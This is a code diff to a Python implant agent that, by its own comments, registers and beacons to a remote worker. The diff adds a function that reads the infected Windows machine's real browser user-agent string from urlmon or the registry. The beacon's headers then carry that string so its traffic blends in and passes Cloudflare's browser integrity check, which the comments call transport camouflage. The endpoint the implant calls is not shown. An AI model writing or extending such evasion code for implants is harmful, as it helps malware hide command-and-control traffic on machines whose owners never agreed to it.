@@ -190,6 +190,38 @@ def runAgent():
                 key += '-' if i in (8, 13, 18, 23) else hexc[int(random.random() * 16)]
             return key
 
+    # The machine's REAL user agent: urlmon's ObtainUserAgentString reports what this
+    # install's IE/WinINET components send; the Internet Settings registry value is the
+    # fallback. Elsewhere (or on failure) a static browser UA stands in — never fatal.
+    def system_user_agent():
+        if is_windows:
+            try:
+                import ctypes
+                buf = ctypes.create_string_buffer(512)
+                size = ctypes.c_uint(512)
+                if ctypes.windll.urlmon.ObtainUserAgentString(0, buf, ctypes.byref(size)) == 0:
+                    ua = buf.value.decode('latin-1', 'replace').strip()
+                    if ua:
+                        return ua
+            except Exception:
+                pass
+            try:
+                try:
+                    import _winreg as winreg
+                except ImportError:
+                    import winreg
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                     'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings')
+                try:
+                    ua = (winreg.QueryValueEx(key, 'User Agent')[0] or '').strip()
+                finally:
+                    key.Close()
+                if ua:
+                    return ua
+            except Exception:
+                pass
+        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+
     def build_identity():
         guid = load_guid()
         arch_map = {'amd64': 'x86_64', 'x86_64': 'x86_64', 'i386': 'i386', 'i686': 'i386',
@@ -241,9 +273,9 @@ def runAgent():
         # reports an implant that registers, beacons, and exits.
         # Transport camouflage, not identity: Cloudflare's Browser Integrity Check
         # (error 1010) 403s urllib's default 'Python-urllib/x' signature at the edge —
-        # every beacon MUST carry a browser UA to reach the worker at all.
+        # the UA is the machine's own when it reports one, else the static stand-in.
         pairs = [
-            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'),
+            ('User-Agent', system_user_agent()),
             ('X-Api-Version', '1'),
             ('X-Device-Id', guid),
             ('X-Session-Id', make_session_key()),
